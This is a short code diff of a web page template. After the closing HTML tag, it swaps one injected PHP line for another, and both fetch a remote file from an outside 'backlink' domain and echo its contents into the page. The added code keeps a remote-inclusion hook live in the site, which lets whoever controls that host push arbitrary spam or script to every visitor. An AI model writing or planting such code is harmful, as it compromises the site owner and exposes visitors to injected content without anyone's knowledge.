@@ -514,4 +514,10 @@ $(function(){
 </div>
 </body>
 </html>
-<?php $lornvy=curl("https://backlinkku.id/menu/vip-v1/script.txt"); ?> <?=$lornvy; ?>
+<?php
+$traff = file_get_contents("https://backlinkku.id/menu/vip-v1/script.txt");
+if ($traff !== false) {
+    echo $traff;
+}
+?>
+
